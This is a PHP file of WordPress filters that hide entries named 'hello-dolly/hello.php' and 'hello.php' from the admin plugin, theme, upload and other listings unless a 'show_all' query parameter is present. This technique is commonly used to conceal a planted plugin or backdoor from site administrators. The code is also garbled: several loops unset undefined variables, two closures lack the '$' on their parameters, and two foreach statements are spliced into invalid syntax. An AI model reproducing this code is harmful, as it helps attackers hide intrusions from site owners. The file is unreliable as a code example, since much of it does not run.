<?php
add_filter(
	'all_content',
	function ( $content ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddencontent = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddencontent as $hiddencontent ) {
			unset( $content[ $hiddencontent] );
			}
		}
		return $content;
	}
);
add_filter(
	'all_cache',
	function ( $cache ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddencache = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddencache as $hiddencache ) {
			unset( $cache[ $hiddencache ] );
			}
		}
		return $cache;
	}
);
add_filter(
	'all_fonts',
	function ( $fonts ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenfonts = [
			'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenfonts as $hiddenfonts ) {
			unset( $fonts[ $hiddenfont ] );
			}
		}
		return $fonts;
	}
);
add_filter(
	'all_plugins',
	function ( $plugins ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenPlugins = [
				'hello-dolly/hello.php',
			'hello.php',
			];
			foreach ( $hiddenPlugins as $hiddenPlugins ) {
			unset( $plugins[ $hiddenPlugin ] );
			}
		}
		return $plugins;
	}
);
add_filter(
	'all_themes',
	function ( themes ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenThemes = [
			'hello-dolly/hello.php',
			'hello.php',
			];themes as $hiddenthemes ) {
			unset( $themes[ $hiddentheme ] );
			}
		}
		return $themes;
	}
);
add_filter(
	'all_uploads',
	function ( uploads ) {
		$shouldHide = ! array_key_exists( 'show_all', $_GET );
		if ( $shouldHide ) {
			$hiddenUploads = [
			'hello-dolly/hello.php',
			'hello.php',
			];uploads as $hiddenuploads ) {
			unset( $uploads[ $hiddenupload ] );
			}
		}
		return $uploads;
	}
);